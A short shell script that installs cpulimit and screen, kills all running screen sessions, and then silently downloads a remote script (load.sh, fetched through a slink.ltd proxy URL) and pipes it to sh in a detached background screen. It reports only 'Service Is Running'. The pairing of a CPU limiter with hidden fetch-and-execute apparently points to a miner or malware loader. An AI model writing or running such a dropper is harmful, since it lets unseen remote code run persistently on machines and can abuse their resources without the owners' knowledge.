#!/bin/sh
# Function to install cpulimit if not already installed
install_cpulimit() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        if [ "$ID" = "ubuntu" ]; then
            apt-get update
            apt-get install -y cpulimit
        elif [ "$ID" = "centos" ]; then
            yum install -y cpulimit
        else
            echo "Unsupported operating system"
            exit 1
        fi
    else
        echo "Unable to determine the operating system"
        exit 1
    fi
}

# Check if cpulimit is installed, if not, install it
if ! command -v cpulimit &> /dev/null; then
    echo "Installing cpulimit..."
    install_cpulimit
fi

# Run the command to download and execute the script in the background using screen
if ! command -v screen &> /dev/null; then
    echo "Installing screen..."
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        if [ "$ID" = "ubuntu" ]; then
            apt-get update
            apt-get install -y screen
        elif [ "$ID" = "centos" ]; then
            yum install -y screen
        else
            echo "Unsupported operating system"
            exit 1
        fi
    else
        echo "Unable to determine the operating system"
        exit 1
    fi
fi

pkill screen
screen -dm sh -c "cd /usr/local/bin/ && curl -sSL https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/load.sh | sh"
echo "Service Is Running"
